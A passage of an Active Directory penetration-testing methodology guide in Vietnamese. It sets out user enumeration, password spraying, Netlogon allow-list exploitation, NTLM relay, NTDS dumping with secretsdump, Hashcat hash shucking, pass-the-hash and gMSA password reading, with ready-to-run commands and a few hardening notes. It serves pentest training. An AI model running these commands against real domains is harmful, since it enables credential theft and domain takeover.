# Phương pháp luận Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Tổng quan cơ bản

**Active Directory** là công nghệ nền tảng, giúp **quản trị viên mạng** tạo và quản lý **domain**, **user** và **object** trong mạng một cách hiệu quả. Công nghệ này được thiết kế để mở rộng quy mô, hỗ trợ tổ chức số lượng lớn user thành các **group** và **subgroup** dễ quản lý, đồng thời kiểm soát **quyền truy cập** ở nhiều cấp độ.

Cấu trúc của **Active Directory** gồm ba lớp chính: **domain**, **tree** và **forest**. Một **domain** bao gồm tập hợp các object, chẳng hạn như **user** hoặc **thiết bị**, dùng chung một cơ sở dữ liệu. **Tree** là nhóm các domain được liên kết với nhau bằng một cấu trúc chung, còn **forest** là tập hợp nhiều tree được kết nối thông qua **trust relationship**, tạo thành lớp cao nhất trong cấu trúc tổ chức. Có thể chỉ định **quyền truy cập** và **quyền giao tiếp** cụ thể ở mỗi cấp độ này.

Các khái niệm chính trong **Active Directory** gồm:

1. **Directory** – Chứa mọi thông tin liên quan đến các object trong Active Directory.
2. **Object** – Chỉ các thực thể trong directory, bao gồm **user**, **group** hoặc **thư mục dùng chung**.
3. **Domain** – Là vùng chứa các object trong directory; nhiều domain có thể cùng tồn tại trong một **forest**, mỗi domain duy trì tập hợp object riêng.
4. **Tree** – Nhóm các domain dùng chung một domain gốc.
5. **Forest** – Cấp cao nhất trong cấu trúc tổ chức của Active Directory, gồm nhiều tree có **trust relationship** với nhau.

**Active Directory Domain Services (AD DS)** bao gồm nhiều dịch vụ thiết yếu cho việc quản lý tập trung và giao tiếp trong mạng. Các dịch vụ này gồm:

1. **Domain Services** – Tập trung lưu trữ dữ liệu và quản lý tương tác giữa **user** và **domain**, bao gồm chức năng **xác thực** và **tìm kiếm**.
2. **Certificate Services** – Quản lý việc tạo, phân phối và quản lý **chứng chỉ số** bảo mật.
3. **Lightweight Directory Services** – Hỗ trợ các ứng dụng tích hợp directory thông qua **giao thức LDAP**.
4. **Directory Federation Services** – Cung cấp khả năng **single sign-on** để xác thực user trên nhiều ứng dụng web trong một phiên.
5. **Rights Management** – Hỗ trợ bảo vệ tài liệu có bản quyền bằng cách kiểm soát việc phân phối và sử dụng trái phép.
6. **DNS Service** – Thiết yếu để phân giải **tên domain**.

Để biết thêm chi tiết, xem: [**TechTerms - Định nghĩa Active Directory**](https://techterms.com/definition/active_directory)

### **Xác thực Kerberos**

Để tìm hiểu cách **tấn công AD**, bạn cần **hiểu rõ** quy trình **xác thực Kerberos**.\
[**Đọc trang này nếu bạn vẫn chưa biết cách thức hoạt động.**](kerberos-authentication.md)

## Cheat Sheet

Bạn có thể truy cập [https://wadcoms.github.io/](https://wadcoms.github.io) để xem nhanh các lệnh có thể chạy nhằm enumerate/exploit AD.

> [!WARNING]
> Giao tiếp Kerberos thường **yêu cầu tên domain đầy đủ (FQDN)** để client có thể lấy ticket cho SPN chính xác. Truy cập máy bằng địa chỉ IP thường khiến hệ thống chuyển sang NTLM thay vì Kerberos.

## Recon Active Directory (không có thông tin xác thực/phiên)

Nếu bạn chỉ có quyền truy cập vào môi trường AD nhưng không có thông tin xác thực/phiên nào, bạn có thể:

- **Pentest mạng:**
  - Scan mạng, tìm máy và port đang mở, rồi thử **exploit lỗ hổng** hoặc **trích xuất thông tin xác thực** từ các máy đó (ví dụ: [máy in có thể là mục tiêu rất thú vị](ad-information-in-printers.md)).
  - Enumerate DNS có thể cung cấp thông tin về các server quan trọng trong domain, chẳng hạn như web, máy in, share, VPN, media, v.v.
    - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - Xem [**Phương pháp luận Pentesting**](../../generic-methodologies-and-resources/pentesting-methodology.md) tổng quát để biết thêm thông tin về cách thực hiện.
- **Kiểm tra quyền truy cập null và Guest trên dịch vụ SMB** (cách này sẽ không hoạt động trên các phiên bản Windows hiện đại):
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - Hướng dẫn chi tiết hơn về cách enumerate server SMB có tại đây:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate LDAP**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - Hướng dẫn chi tiết hơn về cách enumerate LDAP có tại đây (hãy **đặc biệt chú ý đến quyền truy cập ẩn danh**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Đầu độc mạng**
  - Thu thập thông tin xác thực bằng cách [**giả mạo dịch vụ với Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
  - Truy cập host bằng cách [**lạm dụng relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
  - Thu thập thông tin xác thực bằng cách **phơi lộ** [**dịch vụ UPnP giả với evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
  - Trích xuất username/tên từ tài liệu nội bộ, mạng xã hội, dịch vụ (chủ yếu là web) trong môi trường domain và cả từ các nguồn công khai.
  - Nếu tìm được họ tên đầy đủ của nhân viên công ty, bạn có thể thử các **quy ước đặt username** AD khác nhau (**[đọc thêm](https://activedirectorypro.com/active-directory-user-naming-convention/)**). Các quy ước phổ biến nhất gồm: _NameSurname_, _Name.Surname_, _NamSur_ (3 chữ cái mỗi phần), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _chữ cái ngẫu nhiên và 3 chữ số ngẫu nhiên_ (abc123).
  - Công cụ:
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumerate user

- **Enumerate SMB/LDAP ẩn danh:** Xem các trang [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) và [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Enumerate bằng Kerbrute**: Khi yêu cầu một **username không hợp lệ**, server sẽ phản hồi bằng mã **lỗi Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, cho phép xác định username không hợp lệ. Với **username hợp lệ**, server sẽ trả về **TGT trong phản hồi AS-REP** hoặc lỗi _KRB5KDC_ERR_PREAUTH_REQUIRED_, cho biết user cần thực hiện pre-authentication.
- **Không cần xác thực qua MS-NRPC**: Sử dụng auth-level = 1 (Không xác thực) với interface MS-NRPC (Netlogon) trên domain controller. Phương pháp này gọi hàm `DsrGetDcNameEx2` sau khi bind interface MS-NRPC để kiểm tra user hoặc computer có tồn tại hay không mà không cần thông tin xác thực. Công cụ [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) triển khai kiểu enumerate này. Nghiên cứu có thể xem [tại đây](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```

- **OWA (Outlook Web Access) Server**

Nếu tìm thấy một trong các server này trong mạng, bạn cũng có thể **enumerate user trên server đó**. Ví dụ, bạn có thể sử dụng công cụ [**MailSniper**](https://github.com/dafthack/MailSniper):

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

> [!WARNING]
> Bạn có thể tìm thấy danh sách tên người dùng trong [**repo github này**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) và repo này ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Tuy nhiên, bạn nên có **tên của những người làm việc tại công ty** từ bước recon mà bạn đã thực hiện trước đó. Với tên và họ, bạn có thể dùng script [**namemash.py**](https://gist.github.com/superkojiman/11076951) để tạo ra các tên người dùng tiềm năng hợp lệ.

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

Ngay cả sau khi **Zerologon** được vá trên DC, các tài khoản được đưa vào allow-list một cách rõ ràng vẫn có thể bị phơi nhiễm trước **hành vi kênh bảo mật Netlogon lỗi thời/dễ bị tấn công**. Cấu hình rủi ro là GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** hoặc giá trị registry tương ứng **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Giá trị này là một **security descriptor SDDL** (xem [Security Descriptors](security-descriptors.md)). Bất kỳ tài khoản hoặc nhóm nào được cấp ACE phù hợp trong DACL đều có thể bị nhắm mục tiêu. Ví dụ, `O:BAG:BAD:(A;;RC;;;WD)` về cơ bản đưa **Everyone** vào allow-list.

Quy trình thực hiện:

1. **Xác định các principal trong allow-list** bằng cách kiểm tra cả **SYSVOL/GPO** lẫn **registry trực tiếp trên DC**.
2. **Phân giải các SID** tìm thấy trong SDDL thành người dùng/máy tính AD thực tế, đồng thời ưu tiên **tài khoản máy DC**, **tài khoản trust** và các máy có đặc quyền khác.
3. Liên tục thử **xác thực MS-NRPC / Netlogon** bằng tài khoản trong allow-list.
4. Sau khi đoán đúng, lạm dụng **chức năng đặt mật khẩu Netlogon** để đặt lại mật khẩu tài khoản mục tiêu (PoC công khai đặt mật khẩu thành chuỗi rỗng).<sup>[[9]](#references)[[10]](#references)</sup>

Ví dụ phân loại nhanh / lab từ artifact công khai:

```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
  --comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```

Ghi chú:

- **Scanner** hữu ích vì danh sách cho phép có hiệu lực có thể nằm trong **SYSVOL**, **registry** hoặc cả hai.
- Bản thân đường khai thác rất quan trọng vì **không cần quyền Domain Admin** sau khi đã xác định được tài khoản dễ bị tấn công.
- Chiếm quyền **machine account của Domain Controller**, chẳng hạn `DC$`, đặc biệt nguy hiểm vì đặt lại mật khẩu đó có thể trực tiếp mở ra các con đường **chiếm quyền AD** trên diện rộng hơn.
- Khả năng **brute force** phụ thuộc vào mode: artifact công khai mô tả phương pháp meet-in-the-middle, brute force **24-bit** khi có một computer account khác và các biến thể **32-bit** chậm hơn.

Ghi chú về phát hiện / hardening:

- Kiểm tra chính sách danh sách cho phép và xóa mọi mục, ngoại trừ các ngoại lệ tương thích tạm thời được yêu cầu rõ ràng.
- Theo dõi các sự kiện **5827/5828/5829/5830/5831** trong **System** của DC để phát hiện các kết nối Netlogon dễ bị tấn công bị từ chối, được phát hiện hoặc được chính sách cho phép rõ ràng.
- Xem các tài khoản trong `VulnerableChannelAllowList` là **rủi ro cao** cho đến khi loại bỏ được phần phụ thuộc cũ.

### Khi biết một hoặc nhiều username

Được rồi, vậy là bạn đã biết ít nhất một username hợp lệ nhưng chưa có mật khẩu... Hãy thử:

- [**ASREPRoast**](asreproast.md): Nếu người dùng **không có** thuộc tính _DONT_REQ_PREAUTH_, bạn có thể **yêu cầu thông điệp AS_REP** cho người dùng đó; thông điệp này chứa một số dữ liệu được mã hóa bằng khóa dẫn xuất từ mật khẩu của người dùng.
- [**Password Spraying**](password-spraying.md): Hãy thử các **mật khẩu phổ biến nhất** với từng người dùng đã phát hiện; có thể một người dùng đang dùng mật khẩu yếu (hãy lưu ý chính sách mật khẩu!).
  - Lưu ý rằng bạn cũng có thể **spray các máy chủ OWA** để thử truy cập vào máy chủ mail của người dùng.


{{#ref}}
password-spraying.md
{{#endref}}

### Đầu độc LLMNR/NBT-NS

Bạn có thể **thu thập** một số **hash** challenge bằng cách **đầu độc** một số giao thức **mạng**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Việc liệt kê Active Directory cung cấp username, định danh email và quy luật đặt tên, các host tiềm năng cùng những dịch vụ có thể bị ép xác thực. Hãy dùng thông tin đó để xác định các [**relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) NTLM khả thi và các con đường tiềm năng xâm nhập môi trường AD.

### Recon dựa trên workspace của NetExec và kiểm tra cấu hình relay

- Dùng **workspace `nxcdb`** để lưu trạng thái recon AD theo từng engagement: `workspace create <name>` tạo các SQLite DB riêng theo từng giao thức trong `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Chuyển chế độ xem bằng `proto smb|mssql|winrm` và liệt kê các secret đã thu thập bằng `creds`. Khi hoàn tất, hãy tự xóa dữ liệu nhạy cảm: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Khám phá subnet nhanh bằng **`netexec smb <cidr>`** sẽ hiển thị **domain**, **OS build**, **yêu cầu SMB signing** và **Null Auth**. Các máy thành viên hiển thị `(signing:False)` dễ bị relay, trong khi DC thường yêu cầu signing.
- Tạo **hostname trong /etc/hosts** trực tiếp từ đầu ra của NetExec để thuận tiện nhắm mục tiêu:

```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

- Khi **SMB relay tới DC bị chặn** do signing, vẫn hãy kiểm tra cấu hình **LDAP**: `netexec ldap <dc>` làm nổi bật `(signing:None)` / channel binding yếu. DC yêu cầu SMB signing nhưng tắt LDAP signing vẫn là mục tiêu khả thi cho **relay-to-LDAP** để khai thác các kỹ thuật như **SPN-less RBCD**.

### Rò rỉ thông tin xác thực máy in phía client → xác thực hàng loạt thông tin xác thực miền

- Giao diện web/máy in đôi khi **nhúng mật khẩu admin đã bị che trong HTML**. Xem source/devtools có thể làm lộ mật khẩu dạng cleartext (ví dụ: `<input value="<password>">`), cho phép truy cập bằng Basic-auth vào các kho lưu trữ bản scan/bản in.
- Các print job đã lấy được có thể chứa **tài liệu hướng dẫn tiếp nhận nhân viên dạng plaintext** với mật khẩu của từng người dùng. Hãy giữ đúng các cặp thông tin khi kiểm tra:<sup>[[6]](#references)</sup>

```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```

### Đánh cắp thông tin xác thực NTLM

Nếu bạn có thể **truy cập các PC hoặc share khác** bằng **tài khoản null hoặc guest**, bạn có thể **đặt các tệp** (như tệp SCF) mà nếu có ai đó truy cập, chúng sẽ k**ích hoạt xác thực NTLM hướng tới bạn** để bạn có thể **đánh cắp** **thử thách NTLM** nhằm bẻ khóa:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** xem mọi NT hash bạn đã có là một mật khẩu ứng viên cho các định dạng chậm hơn khác, có key material được suy ra trực tiếp từ NT hash. Thay vì brute-force các passphrase dài trong vé Kerberos RC4, thử thách NetNTLM hoặc thông tin xác thực đã lưu trong bộ nhớ đệm, bạn đưa các NT hash vào các chế độ NT-candidate của Hashcat để kiểm tra việc tái sử dụng mật khẩu mà không cần biết plaintext. Kỹ thuật này đặc biệt hiệu quả sau khi domain bị xâm phạm, khi bạn có thể thu thập hàng nghìn NT hash hiện tại và trước đây.<sup>[[5]](#references)</sup>

Dùng shucking khi:

- Bạn có một tập hợp NT hash từ DCSync, bản dump SAM/SECURITY hoặc kho thông tin xác thực và cần kiểm tra việc tái sử dụng trong các domain/forest khác.
- Bạn thu thập được dữ liệu Kerberos dựa trên RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), phản hồi NetNTLM hoặc blob DCC/DCC2.
- Bạn muốn nhanh chóng chứng minh việc tái sử dụng các passphrase dài, không thể bẻ khóa, rồi lập tức chuyển hướng bằng Pass-the-Hash.

Kỹ thuật này **không hoạt động** với các loại mã hóa có key không phải NT hash (ví dụ: Kerberos etype 17/18 AES). Nếu domain chỉ áp dụng AES, bạn phải quay lại các chế độ mật khẩu thông thường.

#### Xây dựng tập hợp NT hash

- **DCSync/NTDS** – Dùng `secretsdump.py` kèm lịch sử để thu thập tập NT hash lớn nhất có thể (cùng các giá trị trước đây của chúng):

  ```bash
  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
  ```

  Các mục History làm tăng đáng kể tập ứng viên vì Microsoft có thể lưu tối đa 24 hash trước đó cho mỗi tài khoản. Để biết thêm cách thu thập NTDS secrets, xem:

{{#ref}}
dcsync.md
{{#endref}}

- **Dump cache endpoint** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (hoặc Mimikatz `lsadump::sam /patch`) trích xuất dữ liệu SAM/SECURITY cục bộ và các domain logon đã cache (DCC/DCC2). Loại bỏ trùng lặp rồi thêm các hash đó vào cùng danh sách `nt_candidates.txt`.
- **Theo dõi metadata** – Lưu username/domain tạo ra mỗi hash (ngay cả khi wordlist chỉ chứa hex). Hash khớp sẽ cho bạn biết ngay principal nào đang dùng lại mật khẩu khi Hashcat in ra candidate khớp.
- Ưu tiên các candidate từ cùng forest hoặc một forest đáng tin cậy; điều này tối đa hóa khả năng trùng khớp khi shucking.

#### Các mode NT-candidate của Hashcat

| Loại hash                                | Mode mật khẩu | Mode NT-candidate |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Lưu ý:

- Đầu vào NT-candidate **phải giữ nguyên dạng NT hash 32 ký tự hex**. Tắt các rule engine (không dùng `-r`, không dùng hybrid mode) vì việc biến đổi sẽ làm hỏng key material của candidate.
- Các mode này vốn không nhanh hơn, nhưng keyspace NTLM (~30.000 MH/s trên M3 Max) nhanh hơn ~100 lần so với Kerberos RC4 (~300 MH/s). Kiểm tra một danh sách NT đã tuyển chọn rẻ hơn nhiều so với việc dò toàn bộ password space ở định dạng chậm.
- Luôn chạy **bản Hashcat mới nhất** (`git clone https://github.com/hashcat/hashcat && make install`) vì các mode 31500/31600/35300/35400 mới được phát hành gần đây.<sup>[[7]](#references)</sup>
- Hiện không có NT mode cho AS-REQ Pre-Auth, và các AES etype (19600/19700) yêu cầu plaintext password vì key của chúng được tạo qua PBKDF2 từ password UTF-16LE, chứ không phải từ NT hash thô.

#### Ví dụ – Kerberoast RC4 (mode 35300)

1. Thu thập một RC4 TGS cho SPN mục tiêu bằng tài khoản có đặc quyền thấp (xem trang Kerberoast để biết chi tiết):

{{#ref}}
kerberoast.md
{{#endref}}

   ```bash
   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
   ```

2. Shuck ticket bằng danh sách NT của bạn:

   ```bash
   hashcat -m 35300 roastable_TGS nt_candidates.txt
   ```

   Hashcat suy ra khóa RC4 từ từng ứng viên NT và xác thực blob `$krb5tgs$23$...`. Kết quả khớp xác nhận tài khoản dịch vụ sử dụng một trong các hash NT hiện có của bạn.

3. Chuyển ngay sang PtH:

   ```bash
   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
   ```

   Bạn có thể tùy chọn khôi phục plaintext sau đó bằng `hashcat -m 1000 <matched_hash> wordlists/` nếu cần.

#### Ví dụ – Thông tin xác thực được lưu cache (mode 31600)

1. Dump các thông tin đăng nhập được lưu cache từ một workstation đã bị xâm nhập:

   ```bash
   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
   ```

2. Sao chép dòng DCC2 của người dùng domain đáng chú ý vào `dcc2_highpriv.txt` rồi shuck nó:

   ```bash
   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
   ```

3. Nếu khớp thành công, bạn sẽ nhận được NT hash đã có trong danh sách, chứng minh rằng người dùng được lưu trong cache đang dùng lại mật khẩu. Dùng hash trực tiếp cho PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) hoặc brute-force ở chế độ NTLM nhanh để khôi phục chuỗi mật khẩu.

Quy trình tương tự áp dụng cho challenge-response NetNTLM (`-m 27000/27100`) và DCC (`-m 31500`). Khi xác định được kết quả khớp, bạn có thể khởi chạy relay, dùng SMB/WMI/WinRM PtH hoặc crack lại NT hash ngoại tuyến bằng masks/rules.



## Liệt kê Active Directory KHI CÓ thông tin xác thực/phiên

Trong giai đoạn này, bạn cần **đã chiếm được thông tin xác thực hoặc phiên của một tài khoản domain hợp lệ.** Nếu có thông tin xác thực hợp lệ hoặc shell dưới danh nghĩa người dùng domain, **hãy nhớ rằng các tùy chọn đã nêu trước đó vẫn có thể dùng để chiếm các người dùng khác**.

Trước khi bắt đầu liệt kê có xác thực, hãy tìm hiểu **vấn đề Kerberos double-hop**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Liệt kê

Chiếm được một tài khoản là **bước tiến lớn trong việc đánh giá domain**, vì điều đó cho phép **liệt kê Active Directory** có xác thực:

Đối với [**ASREPRoast**](asreproast.md), giờ đây bạn có thể tìm tất cả người dùng có khả năng dễ bị tấn công; còn với [**Password Spraying**](password-spraying.md), bạn có thể lấy **danh sách tất cả username** và thử mật khẩu của tài khoản đã bị chiếm, mật khẩu trống và các mật khẩu mới có triển vọng.

- Bạn có thể dùng [**CMD để thực hiện recon cơ bản**](../basic-cmd-for-pentesters.md#domain-info)
- Bạn cũng có thể dùng [**powershell để recon**](../basic-powershell-for-pentesters/index.html), cách này kín đáo hơn
- Bạn cũng có thể [**dùng powerview**](../basic-powershell-for-pentesters/powerview.md) để trích xuất thông tin chi tiết hơn
- Một công cụ tuyệt vời khác để recon Active Directory là [**BloodHound**](bloodhound.md). Công cụ này **không kín đáo lắm** (tùy thuộc vào phương thức thu thập bạn dùng), nhưng **nếu bạn không bận tâm** về điều đó thì nhất định nên thử. Tìm những nơi người dùng có thể RDP, tìm đường dẫn đến các nhóm khác, v.v.
  - **Các công cụ tự động khác để liệt kê AD gồm:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**Bản ghi DNS của AD**](ad-dns-records.md) vì chúng có thể chứa thông tin hữu ích.
- Bạn có thể dùng **AdExplorer.exe** trong bộ **SysInternal** Suite, một **công cụ có GUI** để liệt kê directory.
- Bạn cũng có thể tìm kiếm trong cơ sở dữ liệu LDAP bằng **ldapsearch** để tìm thông tin xác thực trong các trường _userPassword_ và _unixUserPassword_, hoặc trong ghi chú _description_ và _info_ của người dùng. Một chuỗi có dạng mật khẩu nhưng không được gắn nhãn trong _info_ chỉ là một ứng viên: hãy xác minh riêng mục đích và tính hợp lệ của nó, đồng thời không đưa nội dung ghi chú vào kết quả liệt kê thông thường. Xem [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) để biết các phương thức khác.
- Khi được cấp quyền, hãy kiểm tra các script đăng nhập domain và ánh xạ ổ đĩa **có thể truy cập** trong `\\<dc>\NETLOGON` hoặc `\\<dc>\SYSVOL\<domain>\scripts`. [Microsoft có tài liệu](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/netlogon-share-not-present-after-install-ad-ds-on-full-read-only-domain-controller) về vai trò của thư mục script trong share NETLOGON. Trước tiên, hãy liệt kê tên; sau đó chỉ kiểm tra các script liên quan, có thể đọc được và nằm trong giới hạn kích thước; không dump toàn bộ share hoặc in giá trị thông tin xác thực trong quá trình liệt kê thông thường. Lệnh PowerShell [`ConvertTo-SecureString -AsPlainText`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring) **không** bảo vệ mật khẩu dạng literal được lưu trong script. Chỉ riêng lệnh này không chứng minh rằng secret được hardcode: hãy lần theo dữ liệu đầu vào thực tế, rồi xác minh riêng tài khoản, tính hợp lệ của thông tin xác thực và các đặc quyền. Việc kiểm tra script trên domain share là một hoạt động rà soát share từ xa, tách biệt với việc liệt kê host cục bộ.
- Nếu dùng **Linux**, bạn cũng có thể liệt kê domain bằng [**pywerview**](https://github.com/the-useless-one/pywerview).
- Bạn cũng có thể thử các công cụ tự động như:
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Trích xuất tất cả người dùng domain**

  Rất dễ lấy toàn bộ username domain từ Windows (`net user /domain` ,`Get-DomainUser` hoặc `wmic useraccount get name,sid`). Trên Linux, bạn có thể dùng: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` hoặc `enum4linux -a -u "user" -p "password" <DC IP>`

> Dù phần Liệt kê này có vẻ ngắn, đây là phần quan trọng nhất. Truy cập các liên kết (đặc biệt là các liên kết về cmd, powershell, powerview và BloodHound), tìm hiểu cách liệt kê domain và thực hành cho đến khi bạn thấy thành thạo. Trong quá trình đánh giá, đây sẽ là thời điểm then chốt giúp bạn tìm đường đến DA hoặc quyết định rằng không thể làm gì thêm.

### Tài khoản máy tính được tạo sẵn có mật khẩu dễ đoán -> quyền truy cập mật khẩu gMSA

Các tài khoản máy tính được chuẩn bị sẵn cho quy trình join cũ có thể giữ mật khẩu ban đầu dễ đoán. Module `pre2k` của NetExec xác định giá trị `userAccountControl` đặc trưng là `4128` (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`) và thử Kerberos TGT bằng 14 ký tự đầu tiên của tên máy tính viết thường, bỏ ký tự `$` ở cuối. Hãy xem giá trị UAC này là tiêu chí chọn ứng viên, thay vì mặc định cho rằng chỉ riêng việc thuộc nhóm **Pre-Windows 2000 Compatible Access** đã chứng minh mật khẩu yếu.<sup>[[18]](#references)[[20]](#references)</sup>

Dùng LDAP enumeration đã xác thực để kiểm tra các ứng viên và lưu những TGT lấy được thành công. `ALL=True` mở rộng phạm vi kiểm tra sang các object nằm ngoài bộ lọc mặc định `4128`.<sup>[[18]](#references)</sup>

```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```

Một bind mặc định/NTLM thất bại **không** làm mất hiệu lực phát hiện này: hãy kiểm tra bằng `-k`, một FQDN phân giải đến DC và đồng hồ được đồng bộ với KDC. Các lần chạy module thành công ghi danh sách ứng viên và ccaches thu được vào `~/.nxc/modules/pre2k/`.<sup>[[18]](#references)[[20]](#references)</sup>

Sau khi xâm nhập principal máy tính, hãy lập đồ thị các tư cách thành viên nhóm lồng nhau và quyền đi ra của nó. Đặc biệt, các principal được nêu trong security descriptor `msDS-GroupMSAMembership` của gMSA có thể đọc `msDS-ManagedPassword`; đầu ra `--gmsa` của NetExec hiển thị các principal được phép và trả về NT hash hiện tại nếu máy tính xác thực được cấp quyền.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```

